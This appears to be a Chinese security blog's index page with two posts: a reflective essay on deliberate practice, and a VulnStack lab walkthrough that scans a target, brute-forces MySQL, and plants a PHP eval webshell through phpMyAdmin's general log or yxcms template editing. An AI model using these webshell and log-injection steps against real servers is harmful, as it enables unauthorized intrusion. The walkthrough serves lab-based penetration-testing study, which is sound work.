<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/1655090890230.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/1655090890230.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="谁想当安全混子呢">
<meta property="og:type" content="website">
<meta property="og:title" content="Security">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Security">
<meta property="og:description" content="谁想当安全混子呢">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="l3ife">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Security</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Security</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签<span class="badge">2</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类<span class="badge">2</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">2</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/04/%E6%97%A5%E8%AE%B0-%E6%AF%8F%E6%97%A5%E4%B8%80%E8%AE%B0%E4%BD%8F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="l3ife">
      <meta itemprop="description" content="谁想当安全混子呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Security">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/04/%E6%97%A5%E8%AE%B0-%E6%AF%8F%E6%97%A5%E4%B8%80%E8%AE%B0%E4%BD%8F/" class="post-title-link" itemprop="url">猪猪侠大佬</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-10-04 22:36:54 / 修改时间：22:36:46" itemprop="dateCreated datePublished" datetime="2022-10-04T22:36:54+08:00">2022-10-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%97%A5%E8%AE%B0%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">日记记录</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <blockquote>
<p>记录一下猪猪侠这位师傅的话，受益匪浅</p>
</blockquote>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;最近手机卸载了抖音、哗哩哗哩之类的软件，甚至差点把自己的微博都注销了。数据流里信息不断，信息永远是看不完的,并且大部分和你还没啥关系，而真正重要的事情,最后一定会以各种方式挤到你眼前的。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;再就是把微信、钉钉、阿里钉之类的通知都关了。下班和周末的时候,我会定时看下钉钉里是不是有同事的消息，这样，就能化被动为主动，不然这种通知总是会把我的时间切的更碎。举个例子，比如你正在安静的写代码或看书，突然弹出来一条微信消息,你是回还是不回呢?</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;着急的事我也不会错过，他们会打电话给我的。我发现2小时左右集中回复一次微信消息，基本不会错过重要消息，也能保证不被即时通讯打乱正常的工作节奏。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;之前每天自己还特别忙,能主动控制部分时间后，日常节奏也就静下来了。突然一天凌晨看到年轻时候的笔记惊醒，年轻时候的理想去哪了，实现了吗?</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;每个人小时候似乎都有这么个梦想，做一件惊天动地的大事,从此以后大家都会记得我们的名字。所以,我们试图练就—身本领，成为一个无法无天的孙猴子。我很多时候以为自己是个孙悟空，什么都可以。后来我觉得自己是一只猪八戒，为太多东西所困。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;年轻的时候觉得安全技术是神圣的事物，心无旁骛的专心研究,琢磨一个技术细节通宵达旦是常态。我以前理解不了「懈怠」的状态到底是怎么回事,现在看看自己和周围的人，慢慢就懂了。人们到了一定的年龄之后，一个人的「琐事」和「责任」就会越来越多，注意力和精力就跟不上了，让人没有精力和时间再挑战有难度的事情,一直被封锁在低阶状态，陷入低水平循环。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;当你人生有些困惑的时候，千万不要去问同龄人，或者和你格局差不多的人,他们不太能够总结出有效的实践经验，甚至还会恐吓你，更没法给你相对全面、不偏执的人生建议。因为，他们吃的盐、见的世面和你差不多。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;所以我去找了五十岁的迟老师,得到一段话:每个人年轻时都有雄心壮志,我们总想去追求什么，去突破什么，去找寻什么。我们心怀梦想，踏马江湖，拔剑四顾…..人到中年，「似乎不论如何去苦苦追求，总有一些你必须放弃，总有一些你只能怀念，还有一些永远在梦想中。我们永远在计算成败、取舍与得失，却没有人找到正确的答案。</p>
<p>迟老师等于啥都没说，正确的答案得靠自己找。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;于是我打算自己寻找答案，直到昨天一口气读完羽生结弦和藤泽秀行的自传，一个滑冰的,一个下棋的，讲了同一个道理:选定一个方向，努力集中精力在一件事上，每一天都拼尽全力,全力以赴直到获得世界冠军。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;大家精力都是有限的,频繁的上下文切换，每件事都做,浅尝辄止,这是最糟糕的状态。「那么我们可以少做事，但得把这些事做好，做得非常好」，我也不确定这是不是正确的答案，隐约觉得方向是对的，值得去尝试。</p>
<p>《胜负与艺术-我的围棋之路》<br>藤泽秀行自传,4岁开始和下围棋的父亲学棋，14岁成为职业棋手<br>《苍炎1》&#x2F;《苍炎2:飞翔篇》<br>羽生结弦自传，4岁开始滑冰,10岁全国冠军，17岁在国际崭露头角</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;羽生结弦和藤泽秀行让我重新认识了「天赋」，认识到绝大部分事情并不需要天赋。投入时间多，就能做得好，做得越好，就越愿意投入更多时间。他们也不太认可「兴趣爱好」这个说法，因为每个人的兴趣爱好其实都差不多，而且兴趣往往是业余的，上下限都极低，且目标感差。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;一样东西你当做业余兴趣爱好，做到50分的时候就会获得优秀的夸奖，做到60分就会被称赞是个天才。而作为职业选手，做到80分是理所应当的及格线,做到90分只能算是初出茅庐<br>所以，在个人十几年、几十年如一日的职业选手面前，绝大部分人都是渣</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;仔细一想，职业选手经验对大多数人是不适用的，还不能轻易的去模仿。在你的基础训练时长不够、底子不够厚的情况，很多事情其实是做不到的，前10年的基础积累最为关键。冲上来就学职业选手,无异于游戏一开始就把你和玩了上万小时的对手放一起,你每次开局就死，会导致信心迅速丧失，变得消极,那你能喜欢和坚持这个游戏才怪呢。</p>
<hr>
<p><strong>那具体要怎么样才能把一件事情做好呢</strong>?<br>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;万事一理，方法这东西跟内功心法非常相似。把冰滑好，把棋下好，把步跑好，把代码写好，下面的办法适用绝大部分场景……</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;正确的方式还是参考游戏的设计，只有先把基础打牢靠,然后再提升层级，随着投入的时间增加，你能够去较高级一些的地方，这里面人的水平越来越高,你的能力也得到了锻炼。随后你再能够到更高级别的地方。这种游戏设置，让你一直在练习，一直有挑战,一直有乐趣、持续有成就感。<br>做好一件事情的三个要点:<br>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;<strong>要点一</strong>:保证在时间上的持续投入。飞行员不开够一千个小时不能算老手，马拉松运动员的跑量每天都跑几十公里,优秀的程序员也是从对着书一行一行代码敲过来的,直到写够一万行代码。在前期，一个人是没有方向、没有思路、没有全局感的，最重要的就是不断地投入时间实践,过一段时间就会突然清晰了。很多人学技能一无所成，就是死在了这个时间点前。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;你要跑步口号震天,是不是一年下来都没跑够300公里?我现在每个月的目标是跑满10个小时,配速稍差一点也是够100公里的。马拉松运动员的跑量一年大概10000公里,你觉得我有可能跑赢运动员吗?<br>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;<strong>要点二</strong>:在你还没达到60分及格线前降低预期，把每天的目标定低，以至于不需要毅力去做。你可以试试，如果想做成一件事,不要把目标定太高，要追求每天「从容的开始」，而不是一天取得十天的效果。制定目标的时候一定要容易，具体操作的时候，每天把基础目标先达成了，后面再自由调整。<br>*<br>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;<strong>要点三</strong>:确保自己一直在做「有效的」基础练习。最好的训练方法是越练越难,但是在每个阶段都扎实做基础训练。但要准确识别出怎样的路径是持续挑战却非常困难,绝大多数人其实是失败在这里了，要么他自己想不明白，没人指导,要么是指导他的教练不上心或水平不行<br>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;《刻意练习:如何从新手到大师》这本书把练习归纳为3个区(舒适区、学习区、恐慌区)，刻意练习发生在舒适区之外。我把他分解为更加容易理解的舒适区、训练区、挑战区。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;如果你想接触什么新东西，当你选择有所了解的方向，那么就是待在舒适区。但是你如果真的想进步提升，你最好的选择就是在稍微比现在懂的东西复杂一点点的地方训练，也就是训练区。而不是直接跑到挑战区去，因为挑战区难度实在太大。挑战难度大，你的积极性就难免受挫，受挫次数多了，你就很难持续。<br>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;<strong>一个人只有在挑战区摸爬滚打才能有效果，那种一直停留在舒适区和训练区的「不断重复」无法带来进步和让你升阶，也就是你会被一直锁死在基础水平。</strong></p>
<p>最后举一个高考的例子:</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;从过往的数据看90%的孩子智商差不太多，一个学生能否考好，关键是他在高中的三年是不是一直在做「有效练习」，也就是有没有把基础的东西练习足够长的时间。<br>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;在读高中的时候把教科书上的题目练好，对一个高中学生来说是最需要做的基础功课，但是大部分人踏踏实实地做到了吗?当然没有，那为什么没有做到呢?主要大部分人是狂妄的,认为自己非同凡响,要做就做有难度的事，对最基础的事情不屑一顾。<br>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;殊不知，这个世界上所有的事都是相互联系的，你掌握不了这些基本的，你就没办法向前走一步，更何况挑战有难度的,你的水平一直就被锁死在基础阶段。</p>
<hr>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;这也是世界上最常见的一个逻辑:人生这玩意往往是在一个阶段完成所有任务后才能进入下一个阶段，就像游戏里的角色升级,但是生活的诡异之处就在于，没人告诉你有哪些任务是这个阶段必须完成的，所以很多人一直被锁死在低阶状态，陷入低水平循环。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;你选了一个方向，开始集中精力，持续投入时间，做够了扎实的基础训练。跑步运动量上了5万公里,代码量写了100万行,成功渗透入侵的服务器到了1000万台。作为业余选手终于登上了山顶,达到职业选手的及格线水平。迎接你的是下一座高山:职业选手的竞技区。</p>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;进入竞技区后，一般人眼前只有一条下坡路。少有人能看清还有更高阶「把事情做到非常好」的路，也有人看清了但是不愿意走。还有一些类似《强风吹拂》提到的选手，明明没有目的地，却仍日日不间断地跑下去的人，能够断言自己究竟是喜欢还是讨厌吗?<br>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;竞技区的人数较少，但却是个激励竞争的环境。那些职业选手大都经过几十年的艰苦训练，且经验丰富，他们可以随时进入「竞技状态」，完美的身体状态结合平稳的心境，瞬间高出力形成高密集能量释放，把你秒杀掉。<br>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;瞬间的挫败感,你开始感受到差距了，感受到自己普通了,怎么办呢?你为啥想不开非得做职业选手?</p>
<hr>
<p>&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;羽生结弦的答案:“除了努力，也没有别的办法了。我唯一能做的，就是往前走。为此，尽我所有，做我能做的电”<br>&amp;ensp;&amp;ensp;人一生有两次妥协:第一次是意识到父母很普通;第二次是意识到自己也很普通;承认自己普通吧，这没有什么不好。当你承认自己普通的时候，才能够开始真正的带来改变。只要愿望还够强烈。<br>才会有「后来者居上」一说。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/04/[vulnstack]ATT&CK%E6%94%BB%E5%87%BB-1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="l3ife">
      <meta itemprop="description" content="谁想当安全混子呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Security">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/04/%5Bvulnstack%5DATT&CK%E6%94%BB%E5%87%BB-1/" class="post-title-link" itemprop="url">ATT&CK-1</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-10-04 22:30:39 / 修改时间：23:08:22" itemprop="dateCreated datePublished" datetime="2022-10-04T22:30:39+08:00">2022-10-04</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/VulnStack%E9%9D%B6%E5%9C%BA/" itemprop="url" rel="index"><span itemprop="name">VulnStack靶场</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre><code>本文章靶场采用红日靶场，模拟真实企业环境，通过练习、视频教程、博客三位一体学习，从环境搭建、漏洞利用、内网搜集、横向移动、构建通道、持久控制、痕迹清理等方式进行搭建靶场和设计题目。虚拟机所有统一密码为hongrisec@2019
</code></pre>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nyEGD"><img src="https://i.imgtg.com/2022/05/31/nyEGD.png" alt="nyEGD.png"></a></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先下载vulnstack自带的靶场环境，13g没把我吓傻<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">靶场地址</a><br>下载完之后得到三个虚拟机文件，直接在vmware打开就行。首先得配置虚拟机网络，使得能够模拟内网。网络拓扑如下：<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nvpTB"><img src="https://i.imgtg.com/2022/05/31/nvpTB.png" alt="nvpTB.png"></a><br>可以看到Win7需要设置两个网卡，内网网卡和外网网卡。Win3和Win8皆内网网卡即可。</p>
<p>总体编辑网络如下：<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nvJZs"><img src="https://i.imgtg.com/2022/05/31/nvJZs.png" alt="nvJZs.png"></a><br>1.Vm1网卡作为仅主机模式，设置为52网段。因为三台域环境虚拟机的IP初始状态被设置为固定的192.168.52.XXX&#x2F;24网段。（同时已配置好域控IP必定为192.168.52.138）</p>
<p>Win7编辑网络如下：<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nv69r"><img src="https://i.imgtg.com/2022/05/31/nv69r.png" alt="nv69r.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nv47S"><img src="https://i.imgtg.com/2022/05/31/nv47S.png" alt="nv47S.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nvXUM"><img src="https://i.imgtg.com/2022/05/31/nvXUM.png" alt="nvXUM.png"></a>    </p>
<p>Win3和Win8编辑网络如下：<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nvGPi"><img src="https://i.imgtg.com/2022/05/31/nvGPi.png" alt="nvGPi.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nvEzL"><img src="https://i.imgtg.com/2022/05/31/nvEzL.png" alt="nvEzL.png"></a></p>
<p>ping通情况：<br>1.内网win3和win8相互ping通，win7可以ping通外网和内网机器，内网机器则ping不通win7。<br>2.本机可以ping通win7。</p>
<table>
<thead>
<tr>
<th>主机</th>
<th>IP地址</th>
</tr>
</thead>
<tbody><tr>
<td>本机</td>
<td>192.168.123.44</td>
</tr>
<tr>
<td>win7外网服务器</td>
<td>外网IP：192.168.123.42 内网IP：192.168.52.143</td>
</tr>
<tr>
<td>Win3域成员</td>
<td>内网IP：192.168.52.141</td>
</tr>
<tr>
<td>Win8域控主机</td>
<td>内网IP：192.168.52.138</td>
</tr>
<tr>
<td>kali攻击机（MSF、CS服务器）</td>
<td>IP：192.168.123.106</td>
</tr>
</tbody></table>
<h2 id="外网突破"><a href="#外网突破" class="headerlink" title="外网突破"></a>外网突破</h2><p>要进入内网，先进行外网打点，找到目标单位的外网服务站点、主机漏洞，并获得Shell，借助外网服务器当作跳板机访问目标内网。</p>
<p>先了解基本的渗透流程</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">信息收集：目标站点的IP、域名、服务、DNS、端口、框架、数据库</span><br><span class="line"> <span class="string">|</span></span><br><span class="line">外网打点：针对不同点发现漏洞（这里最看重渗透能力）</span><br><span class="line"> <span class="string">|</span></span><br><span class="line">内网提权：寻找可以提权，如内核，命令等</span><br><span class="line"> <span class="string">|</span></span><br><span class="line">内网漫游：寻找内网主机，查看他们漏洞，找通用，CS上线（理想状态）</span><br></pre></td></tr></table></figure>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>使用nmap对目标IP进行端口探测</p>
<blockquote>
<p>nmap -sF -p 1-65535 192.168.123.43</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/ny23S"><img src="https://i.imgtg.com/2022/05/31/ny23S.png" alt="ny23S.png"></a><br>发现存在http、mysql服务。<br>使用nmap对目标IP</p>
<blockquote>
<p>nmap -sF -O 192.168.123.42</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nyXtC"><img src="https://i.imgtg.com/2022/05/31/nyXtC.png" alt="nyXtC.png"></a></p>
<p>查看web服务，收集到的信息如下：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php-version：<span class="number">5.4</span></span><br><span class="line">apache-version：<span class="number">2.4</span></span><br><span class="line">admin邮箱：	admin<span class="meta">@phpStudy</span>.<span class="property">net</span></span><br><span class="line">网站路径：	<span class="attr">C</span>:<span class="regexp">/phpStudy/</span><span class="variable constant_">WWW</span></span><br><span class="line">探针路径：	<span class="attr">C</span>:<span class="regexp">/phpStudy/</span><span class="variable constant_">WWW</span>/<span class="number">1.</span>php</span><br></pre></td></tr></table></figure>
<p>进行路径遍历，使用dirsearch</p>
<blockquote>
<p>python3 dirsearch.py -u “<a target="_blank" rel="noopener" href="http://192.168.123.42/&quot;">http://192.168.123.42/&quot;</a> -x 400,403,503,500</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nyu2L"><img src="https://i.imgtg.com/2022/05/31/nyu2L.png" alt="nyu2L.png"></a></p>
<p>出现phpmyadmin，查看是否可以连接mysql。</p>
<p>在看3306端口，可以使用MSF进行弱密码爆破。</p>
<h3 id="3306端口试探"><a href="#3306端口试探" class="headerlink" title="3306端口试探"></a>3306端口试探</h3><p>查看3306打开，进行弱口令爆破，打开MSF<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/ny3bi"><img src="https://i.imgtg.com/2022/05/31/ny3bi.png" alt="ny3bi.png"></a><br>使用mysql模块</p>
<blockquote>
<p>search mysql</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/npX4F"><img src="https://i.imgtg.com/2022/06/01/npX4F.png" alt="npX4F.png"></a></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use scanner<span class="regexp">/mysql/my</span>sql_login</span><br><span class="line">set USERNAME root</span><br><span class="line">set PASS_FILE <span class="regexp">/home/</span>l3ife<span class="regexp">/字典/</span>撞库列表名单.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>爆破不出来，换种思路。</p>
<h3 id="Mysql写日志shell"><a href="#Mysql写日志shell" class="headerlink" title="Mysql写日志shell"></a>Mysql写日志shell</h3><p>首先看页面，为php探针，用来探测配置，例如查看服务器参数、php模块和参数、检测某些函数能否使用和支持mysql连接正常。<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/npCmb"><img src="https://i.imgtg.com/2022/06/01/npCmb.png" alt="npCmb.png"></a><br>输入root&#x2F;root<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/npwVl"><img src="https://i.imgtg.com/2022/06/01/npwVl.png" alt="npwVl.png"></a><br>连接mysql成功</p>
<p>在前面dirsearch检测目录存在phpmyadmin，root&#x2F;root登录进去目标网站数据库。</p>
<p>phpmyadmin渗透思路：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">get</span> <span class="keyword">shell</span>：</span><br><span class="line">	<span class="keyword">int</span> outfile写入webshell</span><br><span class="line">		<span class="number">1.1</span> 当前数据库用户有写权限</span><br><span class="line">		<span class="number">1.2</span> web绝对路径</span><br><span class="line">		<span class="number">1.3</span> web路径可以写入</span><br><span class="line">日志 <span class="built_in">get</span> <span class="keyword">shell</span>：</span><br><span class="line">	条件：</span><br><span class="line">		<span class="number">1</span>.读写权限+WEB绝对路径</span><br><span class="line">已知CVE攻击</span><br></pre></td></tr></table></figure>
<p>这里尝试一下，先执行SQL语句select @@basedir;查看网站物理路径<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJT4S"><img src="https://i.imgtg.com/2022/06/01/nJT4S.png" alt="nJT4S.png"></a><br>查看数据库用户是否具有写权限<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJU6N"><img src="https://i.imgtg.com/2022/06/01/nJU6N.png" alt="nJU6N.png"></a><br>secure_file_priv默认为NULL，不允许导入导出。直接get shell失败，尝试日志写shell。</p>
<p>执行命令</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>; //查看日志状态，当general_log开启，执行<span class="keyword">SQL</span>语句会存在stu1.<span class="keyword">log</span>里，修改general_log_file的值，执行<span class="keyword">SQL</span>语句就会生成对应文件，便可以执行shell。</span><br><span class="line"><span class="number">2.</span><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log=<span class="string">&#x27;on&#x27;</span>; //开启日志</span><br><span class="line"><span class="number">3.</span><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file=<span class="string">&#x27;C:/phpStudy/www/shell.php&#x27;</span> //指定日志写入到网站根目录下的shell.php文件</span><br><span class="line"><span class="number">4.</span><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span> //写入shell</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJkmL"><img src="https://i.imgtg.com/2022/06/01/nJkmL.png" alt="nJkmL.png"></a><br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJxYi"><img src="https://i.imgtg.com/2022/06/01/nJxYi.png" alt="nJxYi.png"></a></p>
<p>写入shell，直接访问该shell就行。<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJhAt"><img src="https://i.imgtg.com/2022/06/01/nJhAt.png" alt="nJhAt.png"></a><br>进行蚁剑连接。<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJiSx"><img src="https://i.imgtg.com/2022/06/01/nJiSx.png" alt="nJiSx.png"></a></p>
<hr>
<p>这里拿yxcms后台上传shell也可以。<br>网站给了后台地址&#x2F;index.php?r&#x3D;admin &#x2F; 账号密码为admin&#x2F;123456<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJ7np"><img src="https://i.imgtg.com/2022/06/01/nJ7np.png" alt="nJ7np.png"></a><br>cms后台系列，可以找模板编辑，找到“前台编辑”功能，编辑文件：<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJNDU"><img src="https://i.imgtg.com/2022/06/01/nJNDU.png" alt="nJNDU.png"></a><br>需要找到木马上传到哪个位置，通过找到源码发现生成在&#x2F;yxcms&#x2F;protected&#x2F;apps&#x2F;default&#x2F;view&#x2F;default&#x2F;路径（遍历目录存在beifen.rar源码）<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJe6Y"><img src="https://i.imgtg.com/2022/06/01/nJe6Y.png" alt="nJe6Y.png"></a><br>蚁剑连接<br><a target="_blank" rel="noopener" href="https://imgtg.com/image/nJAkv"><img src="https://i.imgtg.com/2022/06/01/nJAkv.png" alt="nJAkv.png"></a><br>自此外网边界突破已成功，重点来学习内网知识。</p>
